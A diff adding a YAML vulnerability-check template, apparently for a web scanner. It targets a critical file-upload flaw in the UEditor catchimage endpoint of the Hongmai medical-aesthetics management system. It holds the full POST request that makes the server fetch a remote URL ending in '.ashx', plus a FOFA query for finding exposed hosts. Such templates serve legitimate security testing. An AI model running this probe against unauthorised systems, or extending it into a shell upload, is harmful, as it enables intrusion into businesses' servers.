@@ -1,0 +1,19 @@
+id: poc-yaml-hmcsoft-ueditor-action-catchimage-upload
+info:
+  name: 宏脉医美行业管理系统UEditor编辑器存在文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 宏脉医美行业管理系统
+  fofa: title="宏脉医美行业管理系统"
+requests:
+- method: POST
+  path: /content/Js/ueditor/net/controller.ashx?action=catchimage
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: source[]=http://www.baidu.com/img/sug_bd.png?.ashx
+  expression: "status_code == 200 && \ncontains(body,`\"state\":\"SUCCESS\"`) &&\n\
+    contains(body,\"http://www.baidu.com/img/sug_bd.png?.ashx\") &&\ncontains(body,`source`)\
+    \ &&\ncontains(body,`list`)\n"
+variables: {}
+transport: http
